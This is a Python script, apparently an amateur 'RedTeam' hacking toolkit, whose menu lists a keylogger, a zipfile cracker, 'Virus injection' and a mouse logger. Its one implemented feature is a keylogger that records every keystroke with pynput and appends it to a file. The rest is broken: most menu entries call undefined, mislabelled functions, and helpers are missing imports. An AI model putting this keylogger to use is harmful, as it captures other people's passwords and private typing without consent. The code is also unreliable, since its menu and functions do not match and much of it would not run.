##!/usr/bin/env python3
# -*- coding: UTF-8 -*-
import pynput.keyboard
import os
Logo = """\033[33m
 ██████╗ ███████╗██████╗ ████████╗███████╗ █████╗ ███╗   ███╗
██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
██████╔╝█████╗  ██║  ██║   ██║   █████╗  ███████║██╔████╔██║
██╔══██╗██╔══╝  ██║  ██║   ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
██║  ██║███████╗██████╔╝   ██║   ███████╗██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚══════╝╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
                                                                                         
                                    \033[97m[!] https://github.com/Z4nzu
\033[97m """


def menu():
    print(Logo + """\033[0m 
    \033[91m[!] This Tool Must Run as a Root..[!] \033[97m
    [00]KeyLogger                 
    [01]Text encryptor
    [02]Zipfile cracker
    [03]random password generator
    [04]Windows Keylogger
    [05]Virus injection
    [06]Password encryptor
    [07]User name Validation
    [08]mouse logger
    """)

    choice = input("R3DT34M  =>> ")
    if choice =="0" or choice== "00":
        clearScr()
        print(Logo)
        keylog()
    elif choice == "1" or choice == "01":
        clearScr()
        print(Logo)
        info()
    elif choice == "2" or choice == "02":
        clearScr()
        print(Logo)
        passwd()
    elif choice == "3" or choice == "03":
        clearScr()
        print(Logo)
        wire()
    elif choice == "4" or choice == "04":
        clearScr()
        print(Logo)
        sqltool()
    elif choice == "5" or choice == "05":
        clearScr()
        print(Logo)
        phishattack()
    elif choice == "6" or choice == "06":
        clearScr()
        print(Logo)
        webAttack()
    elif choice == "7" or choice == "07":
        clearScr()
        print(Logo)
        postexp()
    elif choice == "8" or choice == "08":
        clearScr()
        print(Logo)
        forensic()
def keylog():
    log = ""
    def process_key_press(key):
        global log
        log = log + str(key)
        print(log)
        print(log, file=open("logged.txt", "a"))

    keyboard_listner = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listner:
        keyboard_listner.join()
        menu()


def clearScr():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')
    
